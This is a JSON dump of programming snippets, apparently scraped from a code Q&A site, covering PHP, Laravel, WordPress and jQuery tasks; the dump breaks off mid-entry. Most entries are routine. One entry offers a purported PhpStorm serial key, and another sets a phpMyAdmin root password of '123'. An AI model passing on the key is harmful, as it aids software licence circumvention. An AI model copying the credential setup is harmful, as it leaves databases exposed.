    "description": "EXPORT 1. Connect to your database using phpMyAdmin. 2. From the left-side, select your database. 3. Click the Export tab at the top of the panel. 4. Select the Custom option. 5. You can select the file format for your database. In this example, we will use the default SQL option. 6. Click Select All in the Export box to choose to export all tables. 7. At this stage make note of the WordPress prefix. It will be needed when you are adding the database to your new WordPress Hosting service. In this example it is wp_. 8. Select the check box, Add DROP TABLE / VIEW / PROCEDURE / FUNCTION. 9. If you wish to change the name of your backup database, you can do so in the File name template section . 10. Click Go. 11. This will export your database content in the form of an .sql file to your local computer.\n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4411,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin first login",
    "description": "// in config.sample.inc.php change this to true $cfg['Servers'][$i]['AllowNoPassword'] = false; // in config.sample.inc.php add this  $cfg['Servers'][$i]['user'] = 'root'; $cfg['Servers'][$i]['password'] = '123'; // refresh\n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4412,
    "keyword": null,
    "link": null,
    "title": " phpmyadmin get actual ip",
    "description": "select * from GLOBAL_variables where variable_name like 'hostname'; \n",
    "reg_date": "2021-10-12T10:19:43.000Z"
  },
  {
    "id": 4413,
    "keyword": null,
    "link": null,
    "title": " phpoffice/phpspreadsheet[1.1.0, ..., 1.15.0] require ext-gd * -> it is missing from your system. Install or enable PHP's gd extension",
    "description": "composer require \"ext-gd:*\" --ignore-platform-reqs \n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4414,
    "keyword": null,
    "link": null,
    "title": " phpoffice create excel and download",
    "description": "use PhpOffice\\PhpSpreadsheet\\Spreadsheet; use PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;  class DownloadExcel {     public static function createExcel(array $data, array $headers = [],                                        $fileName = 'data.xlsx')     {         $spreadsheet = new Spreadsheet();         $sheet = $spreadsheet->getActiveSheet();          for ($i = 0, $l = sizeof($headers); $i < $l; $i++) {             $sheet->setCellValueByColumnAndRow($i + 1, 1, $headers[$i]);         }          for ($i = 0, $l = sizeof($data); $i < $l; $i++) { // row $i             $j = 0;             foreach ($data[$i] as $k => $v) { // column $j                 $sheet->setCellValueByColumnAndRow($j + 1, ($i + 1 + 1), $v);                 $j++;             }         }          $writer = new Xlsx($spreadsheet);         header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');         header('Content-Disposition: attachment; filename=\"'. urlencode($fileName).'\"');         $writer->save('php://output');     }  } \n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4415,
    "keyword": null,
    "link": null,
    "title": " phpoffice spreadsheet background color",
    "description": "$spreadsheet->getActiveSheet()->getStyle('A1:A5')->getFill()->setFillType(\\PhpOffice\\PhpSpreadsheet\\Style\\Fill::FILL_SOLID)->getStartColor()->setARGB('ffffff'); \n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4416,
    "keyword": null,
    "link": null,
    "title": " phpserver",
    "description": "$ php -S localhost:8000 router.php\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4417,
    "keyword": null,
    "link": null,
    "title": " phpstorm PHP File Header",
    "description": "//File & Code Templates //https://confluence.jetbrains.com/display/PhpStorm/File+Templates+in+PhpStorm //The one with PHP File Header is located on \"Includes\" tab. //But you can edit default \"PHP File\" template and have your header comment defined right there if you wish.   //WRITE    /**  * Created by PhpStorm.  * Filename: ${FILE_NAME}  * Project Name: ${PROJECT_NAME}  * User: ${USER}  * Date: ${DAY}/${MONTH}/${YEAR}  * Time: ${TIME}  */ \n/**  * Created by PhpStorm.  * Filename: ${FILE_NAME}  * Project Name: ${PROJECT_NAME}  * User: ${USER}  * Date: ${DAY}/${MONTH}/${YEAR}  * Time: ${TIME}  * Github: https://github.com/username  * Telegram: @username  * E-mail: username@email.com  */\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4418,
    "keyword": null,
    "link": null,
    "title": " phpstorm constructor shortcut",
    "description": "alt + insert\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4419,
    "keyword": null,
    "link": null,
    "title": " phpstorm php file header coment",
    "description": "//File & Code Templates //https://confluence.jetbrains.com/display/PhpStorm/File+Templates+in+PhpStorm //The one with PHP File Header is located on \"Includes\" tab. //But you can edit default \"PHP File\" template and have your header comment defined right there if you wish.   //WRITE    /**  * Created by PhpStorm.  * Filename: ${FILE_NAME}  * Project Name: ${PROJECT_NAME}  * User: ${USER}  * Date: ${DAY}/${MONTH}/${YEAR}  * Time: ${TIME}  */ \n/**  * Created by PhpStorm.  * Filename: ${FILE_NAME}  * Project Name: ${PROJECT_NAME}  * User: ${USER}  * Date: ${DAY}/${MONTH}/${YEAR}  * Time: ${TIME}  * Github: https://github.com/username  * Telegram: @username  * E-mail: username@email.com  */\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4420,
    "keyword": null,
    "link": null,
    "title": " phpstorm serial key 2020.2.3",
    "description": "XDSWWERTYUI9876543212QWER5678I  TRE1QASZXCDBHNJUI8765RF54REW32  RTYUT5456YW21QW34RT6YU78I98IUY\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4421,
    "keyword": null,
    "link": null,
    "title": " phpunit/phpunit 7.5.20 requires ext-dom * -> the requested PHP extension dom is missing from your system.",
    "description": "//First of all, read the warning! It says do not run composer as root! Secondly, you're probably using Xammp on your local which has the required php libraries as default. // But in your server you're missing ext-dom. php-xml has all the related packages you need. So, you can simply install it by running:  sudo apt-get update sudo apt install php-xml   //Most likely you are missing mbstring too. If you get the error, install this package as well with:  sudo apt-get install php-mbstring  //Then run: composer update composer require cviebrock/eloquent-sluggable\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4422,
    "keyword": null,
    "link": null,
    "title": " phpunit expect exception",
    "description": "<?php require_once 'PHPUnit/Framework.php';  class ExceptionTest extends PHPUnit_Framework_TestCase {     public function testException()     {         $this->expectException(InvalidArgumentException::class);         // or for PHPUnit < 5.2         // $this->setExpectedException(InvalidArgumentException::class);          //...and then add your test code that generates the exception          exampleMethod($anInvalidArgument);     } }\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4423,
    "keyword": null,
    "link": null,
    "title": " phpword array one word save as",
    "description": "<?php require './modules/vendor/autoload.php'; $templateProcessor = new \\PhpOffice\\PhpWord\\TemplateProcessor(__DIR__ . '/wordfile.docx'); foreach ($tashkilot as $itemtwo) {     $replacements[] = [         'country' => $itemtwo->no,         'date' => $itemtwo->sana,     ]; }  if (!file_exists(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx')) {     $templateProcessor->cloneBlock('nameblock', 0, true, false, $replacements);     $templateProcessor->saveAs(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx'); }\n",
    "reg_date": "2021-10-12T10:19:44.000Z"
  },
  {
    "id": 4424,
    "keyword": null,
    "link": null,
    "title": " phpword codeBlock word save as",
    "description": "<?php require './modules/vendor/autoload.php'; $templateProcessor = new \\PhpOffice\\PhpWord\\TemplateProcessor(__DIR__ . '/wordfile.docx'); foreach ($tashkilot as $itemtwo) {     $replacements[] = [         'country' => $itemtwo->no,         'date' => $itemtwo->sana,     ]; }  if (!file_exists(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx')) {     $templateProcessor->cloneBlock('nameblock', 0, true, false, $replacements);     $templateProcessor->saveAs(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx'); }\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4425,
    "keyword": null,
    "link": null,
    "title": " phpword foreach one word save as",
    "description": "<?php require './modules/vendor/autoload.php'; $templateProcessor = new \\PhpOffice\\PhpWord\\TemplateProcessor(__DIR__ . '/wordfile.docx'); foreach ($tashkilot as $itemtwo) {     $replacements[] = [         'country' => $itemtwo->no,         'date' => $itemtwo->sana,     ]; }  if (!file_exists(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx')) {     $templateProcessor->cloneBlock('nameblock', 0, true, false, $replacements);     $templateProcessor->saveAs(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx'); }\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4426,
    "keyword": null,
    "link": null,
    "title": " phpword word save as",
    "description": "<?php require './modules/vendor/autoload.php'; $templateProcessor = new \\PhpOffice\\PhpWord\\TemplateProcessor(__DIR__ . '/wordfile.docx'); foreach ($tashkilot as $itemtwo) {     $replacements[] = [         'country' => $itemtwo->no,         'date' => $itemtwo->sana,     ]; }  if (!file_exists(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx')) {     $templateProcessor->cloneBlock('nameblock', 0, true, false, $replacements);     $templateProcessor->saveAs(UPLOAD_PATH . '/folder/' . $nomi->chiqnm . \" \" . shaklqisqa($nomi->chiqsh, $nomi->chiqnm) . '.docx'); }\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4427,
    "keyword": null,
    "link": null,
    "title": " pluck array in laravel",
    "description": "$users = User::all()->pluck('field_name'); //for keys instead of [User::all()->pluck('id');] use $user_ids = User::all()->modelKeys();\n$name = DB::table('users')->where('name', 'John')->pluck('name');\n$users = Users::pluck('name','email'); dd($users);\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4428,
    "keyword": null,
    "link": null,
    "title": " pluginhead code",
    "description": "/**  * Plugin Name:       My Basics Plugin  * Plugin URI:        https://example.com/plugins/the-basics/  * Description:       Handle the basics with this plugin.  * Version:           1.10.3  * Requires at least: 5.2  * Requires PHP:      7.2  * Author:            John Smith  * Author URI:        https://author.example.com/  * License:           GPL v2 or later  * License URI:       https://www.gnu.org/licenses/gpl-2.0.html  * Update URI:        https://example.com/my-plugin/  * Text Domain:       my-basics-plugin  * Domain Path:       /languages  */ \n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4429,
    "keyword": null,
    "link": null,
    "title": " pointers php",
    "description": "$b=2; $a=$b; $a=3; print $a; print $b; // output is 32  $b=2; $a=&$b; // note the & operator $a=3; print $a; print $b; // output is 33 \nfunction plus_by_reference( &$param ) {       // what ever you do, will affect the actual parameter outside the function       $param++; }  $a=2; plus_by_reference( $a ); echo $a; // output is 3\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4430,
    "keyword": null,
    "link": null,
    "title": " popup in php",
    "description": "<body> <?php $message='Here is an alert message written by php';   echo '<script type=\"text/javascript\">window.alert(\"'.$message.'\");</script>'; ?> </body> \n<body> <?php $message='Voici un message en javascript &eacute;crit par php';   echo '<script type=\"text/javascript\">window.alert(\"'.$message.'\");</script>'; ?> </body> \n<script>alert(\"<?php echo htmlspecialchars('Voici un message en JS &eacute;crit par PHP', ENT_QUOTES); ?>\")</script> \n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4431,
    "keyword": null,
    "link": null,
    "title": " post request jquery",
    "description": "var formData = {name:\"John\", surname:\"Doe\", age:\"31\"}; //Array   $.ajax({     url : \"https://example.com/rest/getData\", // Url of backend (can be python, php, etc..)     type: \"POST\", // data type (can be get, post, put, delete)     data : formData, // data in json format   \tasync : false, // enable or disable async (optional, but suggested as false if you need to populate data afterwards)     success: function(response, textStatus, jqXHR) {     \tconsole.log(response);     },     error: function (jqXHR, textStatus, errorThrown) { \t\tconsole.log(jqXHR);       \tconsole.log(textStatus);       \tconsole.log(errorThrown);     } });\n$.post( \"test.php\", { name: \"John\", time: \"2pm\" })   .done(function( data ) {     alert( \"Data Loaded: \" + data );   }); \n$.ajax({   type: \"POST\",   url: url,   data: data,   success: success,   dataType: dataType }); \n$.ajax({   method: \"POST\",   url: \"some.php\",   data: { name: \"John\", location: \"Boston\" } })  \n$(function(){     $('#myForm').on('submit', function(e){       e.preventDefault();       $.post('http://www.somewhere.com/path/to/post',           $('#myForm').serialize(),           function(data, status, xhr){            // do something here with response;          });     }); }); \n /* Get from elements values */  var values = $(this).serialize();   $.ajax({         url: \"test.php\",         type: \"post\",         data: values ,         success: function (response) {             // You will get response from your PHP page (what you echo or print)         },         error: function(jqXHR, textStatus, errorThrown) {            console.log(textStatus, errorThrown);         }     }); \n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4432,
    "keyword": null,
    "link": null,
    "title": " post request php",
    "description": "<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">   Name: <input type=\"text\" name=\"fname\">   <input type=\"submit\"> </form> <?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {   // do logic   $name = $_POST['fname']; } ?>\n$response = httpPost(\"http://mywebsite.com/update.php\", \tarray(\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillon\") );  //using php curl (sudo apt-get install php-curl)  function httpPost($url, $data){     $curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n$url = 'http://server.com/path'; $data = array('key1' => 'value1', 'key2' => 'value2');  // use key 'http' even if you send the request to https://... $options = array(     'http' => array(         'header'  => \"Content-type: application/x-www-form-urlencoded\\r\\n\",         'method'  => 'POST',         'content' => http_build_query($data)     ) ); $context  = stream_context_create($options); $result = file_get_contents($url, false, $context); if ($result === FALSE) { /* Handle error */ }  var_dump($result); \n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4433,
    "keyword": null,
    "link": null,
    "title": " post type taxonomy loop wordpress",
    "description": "<?php // Get all the categories $categories = get_terms( 'service-category' );  // Loop through all the returned terms foreach ( $categories as $category ):      // set up a new query for each category, pulling in related posts.     $services = new WP_Query(         array(             'post_type' => 'services',             'showposts' => -1,             'tax_query' => array(                 array(                     'taxonomy'  => 'service-category',                     'terms'     => array( $category->slug ),                     'field'     => 'slug'                 )             )         )     ); ?>  <h3><?php echo $category->name; ?></h3> <ul> <?php while ($services->have_posts()) : $services->the_post(); ?>     <li><?php the_title(); ?></li> <?php endwhile; ?> </ul>  <?php     // Reset things, for good measure     $services = null;     wp_reset_postdata();  // end the loop endforeach; ?>\n",
    "reg_date": "2021-10-12T10:19:45.000Z"
  },
  {
    "id": 4434,
    "keyword": null,
    "link": null,
    "title": " pow php",
    "description": "$z = pow(2, 8); \t// int(256) $z = $x ** $y;\t\t// PHP >= 5.6\n<?php var_dump(pow(2, 8)); // int(256) ?>\n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4435,
    "keyword": null,
    "link": null,
    "title": " pre r",
    "description": "  pre_r($result->fetch_assoc());   function pre_r($array) {     echo '<pre>';     print_r($array);     echo '<pre>';   } ?>\n  pre_r($result);   function pre_r($array) {     echo '<pre>';     print_r($array);     echo '<pre>';   } ?>\n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4436,
    "keyword": null,
    "link": null,
    "title": " prefix routing cakephp",
    "description": "Prefix routing is just very difficult to understand \n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4437,
    "keyword": null,
    "link": null,
    "title": " preg match(): Compilation failed: invalid range in character class at offset 20",
    "description": "/^[a-z0-9]([0-9a-z_\\-\\s])+$/i \n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4438,
    "keyword": null,
    "link": null,
    "title": " preg match in php",
    "description": "<?php //Syntex : int preg_match( $pattern, $input, $matches, $flags, $offset)    // Declare a variable and initialize it  $str = \"Check For Testing.\";     // case-Insensitive search for the word \"Check\"  if (preg_match(\"/\\bCheck\\b/i\", $str, $match))       echo \"Matched!\";  else     echo \"not matched\";        // Output : Matched ?>\n<?php    $line = \"Vi is the greatest word processor ever created!\";    // perform a case-Insensitive search for the word \"Vi\"        if (preg_match(\"/\\bVi\\b/i\", $line, $match)) :       print \"Match found!\";       endif; ?>\n<?php $my_email = \"name@company.com\"; if (preg_match(\"/^[a-zA-Z0-9._-]+@[a-zA-Z0-9-]+\\.[a-zA-Z.]{2,5}$/\", $my_email)) { echo \"$my_email is a valid email address\"; } else {   echo \"$my_email is NOT a valid email address\"; } ?>\n<?php $my_url = \"www.guru99.com\"; if (preg_match(\"/guru/\", $my_url)) { \techo \"the url $my_url contains guru\"; } else { \techo \"the url $my_url does not contain guru\"; } ?>\n<?php  $my_text=\"I Love Regular Expressions\";  $my_array  = preg_split(\"/ /\", $my_text);  print_r($my_array );  ?>\nint preg_match (string pattern, string string [, array pattern_array], [, int $flags [, int $offset]]]); \n<?php function_name('/pattern/',subject); ?>\n<html>        <head>       <title>Hello World</title>    </head>        <body>       <?php echo \"Hello, World!\";?>    </body>  </html>\n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4439,
    "keyword": null,
    "link": null,
    "title": " preg replace",
    "description": " <?php $string = 'April 15, 2003'; $pattern = '/(\\w+) (\\d+), (\\d+)/i'; $replacement = '${1}1,$3'; echo preg_replace($pattern, $replacement, $string); \npreg_replace($pattern, $replacement, $subject [, $limit [, &$count]]); // Returns an array if the subject parameter is an array, // or a string otherwise. // If matches are found, the new subject will be returned, otherwise // subject will be returned unchanged or NULL if an error occurred.\npreg_replace($pattern, $replacement, $string);\n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4440,
    "keyword": null,
    "link": null,
    "title": " prepend 0 to number php",
    "description": "str_pad($month, 2, '0', STR_PAD_LEFT); \n$number = 4; str_pad($number, 2, '0', STR_PAD_LEFT); // returns 04  $number = 14; str_pad($number, 2, '0', STR_PAD_LEFT); // returns 14\nstr_pad($input, 9, \"0\", STR_PAD_LEFT);\n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4441,
    "keyword": null,
    "link": null,
    "title": " prestashop 1.7 breadcrumb",
    "description": "public function getBreadcrumbLinks() {     $breadcrumb = parent::getBreadcrumbLinks();       $breadcrumb['links'][] = [         'title' => $this->getTranslator()->trans('Women', [], 'Breadcrumb'),         'url' => $this->context->link->getModuleLink('module_name', 'controller_name')      ];       $breadcrumb['links'][] = [         'title' => $this->getTranslator()->trans('T-shirts', [], 'Breadcrumb'),         'url' => ''      ];        return $breadcrumb;  } \n",
    "reg_date": "2021-10-12T10:19:46.000Z"
  },
  {
    "id": 4442,
    "keyword": null,
    "link": null,
    "title": " prestashop get all products",
    "description": "$all_products=Product::getProducts($id_lang, $start, $limit, $order_by, $order_way, $id_category = false, $only_active = false, Context $context = null);\n<label style=\"float:left;margin-right: 15px\" class=\"form-control-label hidden-sm-down sort-label\">{l s='Products per page:'}</label> <div style=\"float:left;\" class=\"sort-select dropdown js-dropdown\">     <a class=\"custom-select select-title\" rel=\"nofollow\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">         {$results_per_page}     </a>     <div class=\"dropdown-menu\">         <a rel=\"nofollow\" href=\"?{$ordering}resultsPerPage=25\" class=\"dropdown-item js-search-link\">             25         </a>         <a rel=\"nofollow\" href=\"?{$ordering}resultsPerPage=50\" class=\"dropdown-item js-search-link\">             50         </a>         <a rel=\"nofollow\" href=\"?{$ordering}resultsPerPage=75\" class=\"dropdown-item js-search-link\">             75         </a>         <a rel=\"nofollow\" href=\"?{$ordering}resultsPerPage=100\" class=\"dropdown-item js-search-link\">             100         </a>     </div> </div>\n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4443,
    "keyword": null,
    "link": null,
    "title": " prettier with php",
    "description": "{   \"devDependencies\": {     \"@prettier/plugin-php\": \"0.14.3\",     \"prettier\": \"2.0.5\"   } } \n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4444,
    "keyword": null,
    "link": null,
    "title": " pretty php",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\"); \nprint(\"<pre>\".print_r($array_data,true).\"</pre>\");\n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4445,
    "keyword": null,
    "link": null,
    "title": " prety php",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\");\n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4446,
    "keyword": null,
    "link": null,
    "title": " prevent form submit on page refresh php\\",
    "description": "//Using Javascript <script> if ( window.history.replaceState ) {         window.history.replaceState( null, null, window.location.href );     } </script>\n// add this code to javascript <script>     if ( window.history.replaceState ) {         window.history.replaceState( null, null, window.location.href );     } </script>\n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4447,
    "keyword": null,
    "link": null,
    "title": " prevent xss php",
    "description": "echo htmlspecialchars($string_to_display, ENT_QUOTES, 'UTF-8'); \n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4448,
    "keyword": null,
    "link": null,
    "title": " previous url laravel",
    "description": "{{ URL::previous() }} \n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4449,
    "keyword": null,
    "link": null,
    "title": " prime number in php",
    "description": "<?php function IsPrime($n) {  for($x=2; $x<$n; $x++)    {       if($n %$x ==0) \t      { \t\t   return 0; \t\t  }     }   return 1;    } $a = IsPrime(3); if ($a==0) echo 'This is not a Prime Number.....'.\"\\n\"; else echo 'This is a Prime Number..'.\"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:19:47.000Z"
  },
  {
    "id": 4450,
    "keyword": null,
    "link": null,
    "title": " print all session in codeigniter",
    "description": "print_r($this->session->userdata);   or  print_r($this->session->all_userdata());\n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4451,
    "keyword": null,
    "link": null,
    "title": " print array in php",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \n// raw array output print_r($arr);  // the above well-formatted echo '<pre>'; print_r($array); echo '</pre>';  // more details like datatype and length var_dump($arr);  // output that PHP understands var_export($arr);  // by foreach loop foreach($arr as $key=>$value)   echo $key, '=>', $value;\t// $value must be convertible to string\n<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a); ?>\nforeach($results['data'] as $result) {     echo $result['type'], '<br>'; }\nforeach($results as $result) { \techo $result . '<br>'; }\nprint_r($array);\n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4452,
    "keyword": null,
    "link": null,
    "title": " print array items in php",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \n// raw array output print_r($arr);  // the above well-formatted echo '<pre>'; print_r($array); echo '</pre>';  // more details like datatype and length var_dump($arr);  // output that PHP understands var_export($arr);  // by foreach loop foreach($arr as $key=>$value)   echo $key, '=>', $value;\t// $value must be convertible to string\nforeach($results['data'] as $result) {     echo $result['type'], '<br>'; }\n<?php $data = array('a'=>'apple','b'=>'banana','c'=>'orange');?> <pre><?php print_r($data); ?></pre> \n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4453,
    "keyword": null,
    "link": null,
    "title": " print array on php",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \nforeach($results['data'] as $result) {     echo $result['type'], '<br>'; }\n<?php $data = array('a'=>'apple','b'=>'banana','c'=>'orange');?> <pre><?php print_r($data); ?></pre> \n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4454,
    "keyword": null,
    "link": null,
    "title": " print array php",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \nfunction echo_arr($arr){         for ($i=0; $i < count($arr); $i++) {                  echo $arr[$i];             }         }  echo_arr($your_array_here);\n// raw array output print_r($arr);  // the above well-formatted echo '<pre>'; print_r($array); echo '</pre>';  // more details like datatype and length var_dump($arr);  // output that PHP understands var_export($arr);  // by foreach loop foreach($arr as $key=>$value)   echo $key, '=>', $value;\t// $value must be convertible to string\n<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a); ?>\nforeach($results['data'] as $result) {     echo $result['type'], '<br>'; }\nforeach($results as $result) { \techo $result . '<br>'; }\n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4455,
    "keyword": null,
    "link": null,
    "title": " print beauty php",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\"); \n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4456,
    "keyword": null,
    "link": null,
    "title": " print button code in php",
    "description": "<button onClick=\"window.print()\">Print</button>\n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4457,
    "keyword": null,
    "link": null,
    "title": " print in php",
    "description": "<?php   echo \"Hello World!\"; // You can also do this with a variable: $YourVariable = \"Hello World!\"; echo $YourVariable; ?>\nSource link: https://www.programmingquest.com/2019/04/difference-between-echo-and-print.html  1. echo Statement * we can write echo statement with parenthesis like 'echo()' or without parenthesis 'echo'. * In the echo we can pass multiple variable in comma separated form to see the output like 'echo $a,$b,$c;' * echo doesn&rsquo;t return any value * echo is faster then print  2. Print Statement * we can write print statement with parenthesis like 'print()' or without parenthesis 'print'. * In the print we can not pass multiple variable in comma separated form like echo. * print statement always returns 1. * print is slower than echo\nprint_r(\"\");\n<html> <body>  <?php $txt1 = \"test\"; $txt2 = \"test\"; $x = num; $y = num;  print \"<h2>\" . $txt1 . \"</h2>\"; print \"test \" . $txt2 . \"<br>\"; print $x + $y; ?>  </body> </html>   \n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4458,
    "keyword": null,
    "link": null,
    "title": " print last query in codeigniter",
    "description": "print_r($this->db->last_query());    \n$this->db->last_query();\n$this->db->last_query();  Returns the last query that was run (the query string, not the result). Example: $str = $this->db->last_query();  // Produces: SELECT * FROM sometable....  \nWe can get last executed query using last_query() function of db class in codeigniter. It is a very simple to use $this->db->last_query() function to see SQL statements of last executed query in php codeigniter app. You have to simple code that function after your main query that you wanted check  $this->db->last_query()\npublic function test_db(){    $query = $this->db->get(\"items\");      $str = $this->db->last_query();       echo \"<pre>\";    print_r($str);    exit;}\n",
    "reg_date": "2021-10-12T10:19:48.000Z"
  },
  {
    "id": 4459,
    "keyword": null,
    "link": null,
    "title": " print last query laravel",
    "description": "DB::enableQueryLog();  dd(DB::getQueryLog());\nDB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4460,
    "keyword": null,
    "link": null,
    "title": " print last sql query laravel",
    "description": "DB::enableQueryLog();  dd(DB::getQueryLog());\nDB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4461,
    "keyword": null,
    "link": null,
    "title": " print only some characters of a string in php",
    "description": " <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$firstStringCharacter = substr(\"hello\", 0, 1);\nsubstr(string,start,length)\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4462,
    "keyword": null,
    "link": null,
    "title": " print prety php",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\");\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4463,
    "keyword": null,
    "link": null,
    "title": " print query statement in laravel",
